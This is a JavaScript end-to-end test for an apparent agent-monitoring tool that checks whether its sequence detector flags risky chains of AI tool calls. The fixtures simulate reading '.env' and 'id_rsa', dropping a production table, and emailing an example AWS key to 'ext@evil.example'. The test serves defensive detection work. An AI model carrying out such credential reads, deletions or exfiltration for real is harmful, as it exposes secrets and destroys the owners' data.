// End-to-end check that sequence detection fires through the real enforce_policy
// tool path, and that it can only tighten a decision, never loosen one.
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const tmp = mkdtempSync(join(tmpdir(), 'br-seq-e2e-'));
process.env.BLAST_RADIUS_AUDIT_PATH = join(tmp, 'audit.jsonl');

const { BlastRadiusServer } = await import('../dist/src/server.js');
const { AuditLedger } = await import('../dist/src/security/auditLedger.js');
const { SequenceDetector } = await import('../dist/src/analyzer/sequenceDetector.js');

AuditLedger.initialize(process.env.BLAST_RADIUS_AUDIT_PATH);
const server = new BlastRadiusServer();

// Drive the same call path enforce_policy uses, writing real ledger entries.
function decide(toolName, parameters) {
  const { DLPScanner } = require('../dist/src/analyzer/dlpScanner.js');
  return null;
}

// Exercise the ledger the way enforce_policy does, then analyze.
const { BlastRadiusEngine } = await import('../dist/src/analyzer/blastRadiusEngine.js');
const { DLPScanner } = await import('../dist/src/analyzer/dlpScanner.js');
const { PolicyDecision } = await import('../dist/src/types.js');

function step(toolName, params) {
  const serialized = JSON.stringify(params);
  const dlp = DLPScanner.scan(serialized, false);
  const report = BlastRadiusEngine.evaluate(serialized);
  const policy = server.policyEngine ?? null;
  AuditLedger.record({
    toolName,
    callerId: 'agent-client',
    category: report.category,
    decision: PolicyDecision.ALLOW,
    dangerScore: report.dangerScore,
    severity: report.severity,
    reasons: [report.reasons[0] ?? ''],
    dlpFindingsCount: dlp.findingsCount,
    rawPayload: params
  });
  return { report, dlp };
}

console.log('=== 1. read a secret, then destroy (exfiltration-then-destruction) ===');
step('read_file', { path: '.env' });
step('read_file', { path: 'id_rsa' });
// Must actually be a destructive payload, or the detector correctly ignores it.
step('delete_records', { command: 'DROP TABLE production_users' });

let a = SequenceDetector.fromPolicy().analyzeFromLedger();
console.log(`signals: ${a.signals.length}`);
for (const s of a.signals) {
  console.log(`  ${s.id} | ${s.severity} | conf ${s.confidence} | ${s.recommendedAction}`);
  console.log(`    ${s.reason}`);
}

console.log('\n=== 2. recon then exfil (reconnaissance-then-exfiltration) ===');
AuditLedger.reset();
for (let i = 0; i < 6; i++) step('read_records', { table: `table_${i}`, id: i });
step('send_email', { to: 'ext@evil.example', body: 'AKIAIOSFODNN7EXAMPLE' });

a = SequenceDetector.fromPolicy().analyzeFromLedger();
console.log(`signals: ${a.signals.length}`);
for (const s of a.signals) {
  console.log(`  ${s.id} | ${s.severity} | conf ${s.confidence} | ${s.recommendedAction}`);
  console.log(`    ${s.reason}`);
}

console.log('\n=== 3. legitimate session should be quiet ===');
AuditLedger.reset();
step('read_records', { table: 'users', id: 1 });
step('read_records', { table: 'orders', id: 2 });
step('write_record', { table: 'notes', id: 3 });
step('list_files', { dir: './src' });

a = SequenceDetector.fromPolicy().analyzeFromLedger();
console.log(`signals: ${a.signals.length} (expected 0)`);
for (const s of a.signals) console.log(`  ${s.id}: ${s.reason}`);

console.log('\n=== 4. audit chain still verifies after all that ===');
console.log(JSON.stringify(AuditLedger.verifyIntegrity(500), null, 2));

rmSync(tmp, { recursive: true, force: true });